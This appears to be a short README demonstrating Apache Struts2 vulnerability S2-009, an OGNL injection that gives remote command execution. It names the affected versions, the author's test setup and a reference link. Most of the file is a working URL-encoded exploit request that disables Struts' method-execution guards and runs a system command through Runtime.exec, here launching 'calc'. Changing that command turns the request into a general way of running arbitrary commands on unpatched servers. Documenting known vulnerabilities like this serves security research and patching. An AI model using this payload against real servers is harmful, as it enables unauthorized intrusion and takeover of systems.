# S2-009 Demo

## Summary

Impact of vulnerability: Remote command execution

Affected Software: `Struts 2.0.0` - `Struts 2.3.1.1`

Problem: `XWork` bypass allows `OGNL` statement execution

## Environment

Struts2 Version: `Struts-2.2.3`

Server: `Tomcat 6.0.9` (Only in this version did I run payload successfully).

IDE: `idea 2020.1.1 ULTIMATE`

## POC

![{39A82E8C-90BA-420A-BBEE-27B90FEEF2EC}_20200713172021]({39A82E8C-90BA-420A-BBEE-27B90FEEF2EC}_20200713172021.jpg)

## payload

`test.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27calc%27%29%29%28meh%29&z[%28foo%29%28%27meh%27%29]=true`

## Reference

- [S2-009](https://cwiki.apache.org/confluence/display/WW/S2-009)

